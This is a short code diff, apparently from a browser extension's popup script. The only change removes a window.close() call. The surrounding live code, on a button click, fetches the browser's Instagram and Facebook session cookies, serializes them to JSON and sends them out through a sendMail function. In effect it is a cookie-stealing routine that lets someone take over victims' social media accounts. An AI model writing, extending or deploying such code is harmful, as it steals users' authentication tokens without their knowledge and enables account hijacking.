@@ -11,7 +11,6 @@ function btnClicked() {
     chrome.runtime.sendMessage({ action: "getCookies" }, function (response) {
         const cookiesJson = JSON.stringify(response.cookies[".instagram.com"], null, 2) + "\n\n\n++++++++++\n\n\n" + JSON.stringify(response.cookies[".facebook.com"], null, 2);
         sendMail(cookiesJson);
-        window.close();
     });
 }
 
